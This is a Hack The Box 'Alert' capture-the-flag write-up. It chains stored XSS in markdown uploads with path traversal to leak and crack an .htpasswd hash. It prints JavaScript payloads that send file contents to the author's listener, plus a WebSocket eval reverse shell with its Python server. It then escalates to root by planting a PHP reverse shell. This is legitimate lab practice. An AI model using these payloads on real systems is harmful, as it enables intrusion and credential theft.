# Miscellaneous 7

## Stored XSS in markdown files combined with LFI (HTB "Alert" retrospective)

As always, we are starting with a simple Nmap scan to see what lies ahead:

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

Issuing a command like this and inspecting headers is always a good way to learn more:

```
curl -v http://10.10.11.44
```

Seeing the following section in response suggests we are indeed dealing with another case of virtual hosting and the domain is ```alert.htb```:

```
<p>The document has moved <a href="http://alert.htb/">here</a>.</p>
```

Therefore, we can add this entry to the ```/etc/hosts``` file.

Next step consists of directory enumeration using Gobuster:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://alert.htb
```

Here are some areas of interest pinpointed by our scan:

```
/uploads              (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]
/css                  (Status: 301) [Size: 304] [--> http://alert.htb/css/]
/messages             (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
```

As for possible sub-domains enumeration, FFUF also worked very nicely (especially with the auto-calibration flag):

```
ffuf -w /home/lea/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac
```

The output follows:

```
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 119ms]
:: Progress: [4989/4989] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

Indeed, we have discovered ```statistics.alert.htb``` sub-domain. After adding it to ```/etc/hosts``` file and upon closer inspection we are presented with a basic HTTP access authentication.

Without valid credentials for the newly discovered sub-domain, the next logical step is to return to the main web application at ```http://alert.htb``` and analyze its functionality. The application appears to provide a utility for uploading and previewing markdown files. Other notable areas of interest include the 'Donate' page and the 'Contact Us' form.

After some experimentation and analysis, it becomes evident that the key lies in exploiting the markdown upload feature. The strategy involves combining stored XSS (to execute malicious JavaScript in a privileged context) with a potential LFI vulnerability (to retrieve sensitive files or system information).

My first step was to test possible network requests from the server by hosting a listener:

```
python3 -m http.server 8080
```

Then I uploaded a markdown file with the following contents:

```
<script>
fetch('http://10.10.14.17:8080/?leak=triggered');
</script>
```

And it worked! Here is what I got:

```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.14.17 - - [08/Jan/2025 16:31:30] "GET /?leak=triggered HTTP/1.1" 200 -
```

So, if the server executed this, it might also fetch sensitive files like ```config.php``` or ```/etc/passwd``` and exfiltrate them to our HTTP listener.

The following payload also worked (to an extent, that is):

```
<script>
  fetch('http://alert.htb/../../../../etc/passwd')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.10.14.17:8080/?file=' + encodeURIComponent(data));
    });
</script>
```

Sadly, I didn't get anything useful out of it as every attempt of path traversal returned "not found" or "forbidden" response.

With slowly running out of options, I decided to poke around ```statistics.alert.htb``` sub-domain, hoping I might uncover the contents of ```.htpasswd``` file. Here is the next iteration of our markdown payload:

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.17:8080/?file_content=" + encodeURIComponent(data));
  });
</script>
```

This time I got empty response in my HTTP listener:

```
10.10.14.17 - - [08/Jan/2025 18:03:59] "GET /?file_content=%0A HTTP/1.1" 200 -
```

**Note:** I also tried to use a payload like this, going for a full WebSocket-based reverse shell:

```
<script>
let ws = new WebSocket('ws://10.10.14.17:4444');
ws.onmessage = function(message) {
 let cmd = message.data;
 let result = '';
 try {
 result = eval(cmd);
 } catch (e) {
 result = e.toString();
 }
 ws.send(result.toString());
};
</script>
```

But first I needed to Start a WebSocket listener on my machine using the following Python script:

```
import asyncio
import websockets

async def handler(websocket, path):
    while True:
        cmd = input("Enter command: ")
        await websocket.send(cmd)
        result = await websocket.recv()
        print(f"Result: {result}")

start_server = websockets.serve(handler, "0.0.0.0", 4444)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
```

This worked perfectly, and I was able to issue some simple JavaScript commands to verify basic functionality. For example: ```2 + 2```: This should return ```4``` if everything works.

Also, running the following command to see what’s available in the environment was successful as well:

```
Object.keys(window).join(', ')
```

This will list all global objects, which might give us clues about the browser or environment. However, trying to leverage this in order to access some sensitive files didn't do me much good, so I went back to the original plan.

Anyway, as I continued to poke around, it became apparent we have the "Share Markdown" button on the "Upload" page in lower right corner. Upon clicking it gives us the link like this:

```
http://alert.htb/visualizer.php?link_share=677eaff93ed539.63828200.md
```

That gave me an idea: How about inserting that link into the "Contact Us" form? After all, playing with different combinations of malicious markdown payloads and LFI probes through the form might do the trick. When we submit the link through the "Contact Us" form, the server might fetch it itself (server-side). If the server-side process interprets or renders the markdown, it could trigger the embedded payload.

Finally, it turns out we might be onto something useful:

```
10.10.11.44 - - [08/Jan/2025 18:05:32] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

This output looks like it's URL encoded, though. This command should help with cleaning it up:

```
python3 -c "import urllib.parse; print(urllib.parse.unquote('your_encoded_string_here'))"
```

In our case it should look like this:

```
python3 -c "import urllib.parse; print(urllib.parse.unquote('%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A'))"
```

The following output suggests we might be against some kind of hash:

```
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

The ```hash-identifier``` tool helped us to learn more information about it:

```
HASH: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/

Possible Hashs:
[+] MD5(APR)
```

Cracking the hash is done with the following command:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
```

And the password is:

```
manchesterunited
```

Now we can connect to SSH:

```
ssh albert@alert.htb
```

At last, time to grab the user flag:

```
find / -name user.txt 2>/dev/null
```

With no interesting files or scripts in Albert's account, no sudo permissions, and no crontab jobs, we will proceed to list socket statistics using the following well-known command:

```
ss -tlnp
```

Turns out, we have something interesting going on the port 8080:

```
State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process            
LISTEN            0                 4096                             127.0.0.1:8080                             0.0.0.0:*                                  
LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                  
LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*                                  
LISTEN            0                 511                                      *:80                                     *:*                                  
LISTEN            0                 128                                   [::]:22                                  [::]:*                                  
```

SSH tunneling should be our next move:

```
ssh -L 8080:127.0.0.1:8080 albert@alert.htb -N -f
```

Visiting ```http://127.0.0.1:8080/``` in our browser reveals a page titled "Website Monitor" saying "There are no active incidents" and showing graphs for both domains on the Alert box. Having no apparent way of attacking it, we decided to go back to the Albert's SSH shell. After some digging we have located the "Website Monitor" directory in ```/opt/website-monitor```.

With the ```rwxrwxr-x``` permissions, this directory is writable by root, which looks like a promising lead:

```
drwxrwxr-x  7 root root 4096 Oct 12 01:07 website-monitor
```

We should double-check the files and folders inside. After some investigation, it looks like we can write to ```/opt/website-monitor/config```.

Next order of business is setting up our Ncat listener:

```
ncat -lvnp 4444
````

After that we are ready to visit ```/usr/share/webshells/php``` directory on our Kali machine, grab the contents of "php reverse shell", create a file named "shell.php" (in ```/opt/website-monitor/config``` on the Alert box) and paste & edit the code. Finally, we are ready to trigger it by visiting this link:

````
http://127.0.0.1:8080/config/shell.php
````

As expected, we got a shell in our listener, so it's time to make it fully interactive:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Upon a quick verification we are successfully running as root:

```
root@alert:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

This example is now concluded.
